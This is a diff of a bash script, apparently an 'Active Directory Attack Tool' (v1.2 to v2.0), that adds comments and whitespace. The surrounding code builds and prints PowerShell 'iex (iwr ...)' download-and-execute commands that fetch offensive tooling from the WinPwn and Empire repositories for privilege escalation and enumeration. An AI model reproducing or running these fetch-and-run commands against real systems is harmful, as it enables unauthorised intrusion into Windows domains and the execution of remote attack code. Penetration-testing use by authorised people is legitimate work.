@@ -30,12 +30,23 @@ S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/mast
 iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
 
+################################################################################
+# Prerequisites                                                             #
+################################################################################
 
-# Wordlists
+#ansi2html
+#seclists
+#Repo's
+
+
+################################################################################
+# Wordlists                                                                    #
+################################################################################
+
 UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
 
 ################################################################################
-# Colors                                                                    #
+# Colors                                                                       #
 ################################################################################
 
 RESTORE='\033[0m'
@@ -58,6 +69,7 @@ WHITE='\033[01;37m'
 
 IBLUE='\033[02;34m'
 ICYAN='\033[02;36m'
+
 
 ################################################################################
 # Options                                                                      #
@@ -117,8 +129,7 @@ while [ $# -gt 0 ]; do
                 shift
                 shift
                 ;;
-       
-                                                                                                                                        
+                                                                                                                                                      
                 
         *)
                 POSITIONAL="${POSITIONAL} $1"
@@ -136,7 +147,7 @@ echo -e ""
 echo 'CSAgICBfICAgIF9fX18gICAgXyAgX19fX18gCgkgICAvIFwgIHwgIF8gXCAgLyBcfF8gICBffAoJICAvIF8gXCB8IHwgfCB8LyBfIFwgfCB8ICAKCSAvIF9fXyBcfCB8X3wgLyBfX18gXHwgfCAgCgkvXy8gICBcX1xfX19fL18vICAgXF9cX3w=' | base64 -d
 echo -e ""
 echo -e ""
-echo -e "	${LGREEN}Active Directory Attack Tool v1.2${RESTORE}"
+echo -e "	${LGREEN}Active Directory Attack Tool v2.0${RESTORE}"
 echo -e  "	${LGREEN}Author:	ViperOne${RESTORE}"
 echo -e ""
 echo -e ""
@@ -543,6 +554,7 @@ echo -e "${LRED}┌────────────────────�
 echo -e "									  ${LGREEN}♠ Privilege Escalation ♠${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e ""
+# Tools
 echo -e "${LGREEN}Tools${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
@@ -568,6 +580,7 @@ echo -e "${LRED}┌────────────────────�
 echo -e "									${LGREEN}♠ Enumeration ♠${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e ""
+# Local Enumeration
 echo -e "${LGREEN}Local Enumeration${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Get-ComputerDetails${RESTORE}"
@@ -586,6 +599,7 @@ echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.
 echo -e ""
 echo -e ""
 echo -e ""
+# Network Enumeration
 echo -e "${LGREEN}Network Enumeration${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
